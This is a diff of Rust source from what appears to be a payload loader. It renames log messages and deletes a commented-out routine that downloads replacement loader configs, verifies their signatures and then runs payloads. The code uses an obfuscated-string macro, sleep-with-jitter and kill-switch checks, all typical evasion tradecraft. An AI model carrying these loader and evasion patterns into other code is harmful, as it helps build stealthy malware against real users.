@@ -68,88 +68,12 @@ fn main() {
         config.print_loader_without_sign_material();
         config.sleep_and_jitt();
 
-        info!("{}", lc!("[+] DEFUSE RELOAD config"));
+        info!("{}", lc!("[+] DEFUSE UPDATE config"));
         if config.stop_defuse(&config.defuse_update) {
-            error!("{}", lc!("[!] DEFUSE STOP reload config"));
+            error!("{}", lc!("[!] DEFUSE STOP update config"));
         } else {
             info!("{}", lc!("[+] UPDATE config"));
             config = config.update_config();
-            /*
-            let mut nb_config: i32 = 0;
-            let mut change_loader = false;
-            let mut replacement_loaderconf: Config = Config::new_empty();
-            info!("{}", lc!("[+] RELOAD config"));
-
-            for conflink in &config.update_links {
-                nb_config = nb_config + 1;
-                info!(
-                    "{}/{}{}{:?}",
-                    nb_config,
-                    &config.update_links.len(),
-                    lc!(" config link: "),
-                    &conflink
-                );
-                let result = conflink.fetch_data();
-                let data = match result {
-                    Ok(data) => data,
-                    Err(error) => {
-                        warn!("{}{}", lc!("error: "), error);
-                        continue;
-                    }
-                };
-                debug!("{}", lc!("deserialized data"));
-                let newloader: Config = match serde_json::from_slice(&data) {
-                    Ok(newloader) => newloader,
-                    Err(error) => {
-                        warn!("{}{}", lc!("error: "), error);
-                        continue;
-                    }
-                };
-                debug!("{}", lc!("new loader downloaded:"));
-                newloader.print_loader_compact();
-                let verified = match config.verify_newloader_sign(&newloader) {
-                    Ok(()) => true,
-                    _unspecified => false,
-                };
-                if verified {
-                    info!("{}{}", lc!("verify signature: "), verified);
-                } else {
-                    warn!("{}{}", lc!("verify signature: "), verified);
-                }
-                if verified {
-                    let is_same_loader = config.is_same_loader(&newloader);
-                    if is_same_loader {
-                        info!("{}{}", lc!("same loader: "), is_same_loader);
-                    } else {
-                        warn!("{}{}", lc!("same loader: "), is_same_loader);
-                    }
-                    if is_same_loader {
-                        info!(
-                            "{}",
-                            lc!("[+] DECISION: keep the same active LOADER, and run the payloads")
-                        );
-                        break;
-                    } else {
-                        info!(
-                        "{}",
-                        lc!("[+] DECISION: replace the active LOADER by this one, and run the payloads")
-                    );
-                        change_loader = true;
-                        replacement_loaderconf = newloader;
-                        break;
-                    }
-                }
-                info!(
-                    "{}",
-                    lc!("[+] DECISION: try to fetch an other loader with next link")
-                );
-            }
-
-            if change_loader {
-                info!("{}", lc!("[+] LOADER replaced"));
-                config = replacement_loaderconf;
-            }
-            */
             info!("{}", lc!("[+] DEFUSE payload exec"));
             if config.stop_defuse(&config.defuse_payload) {
                 error!("{}", lc!("[!] DEFUSE STOP the payload exec"));
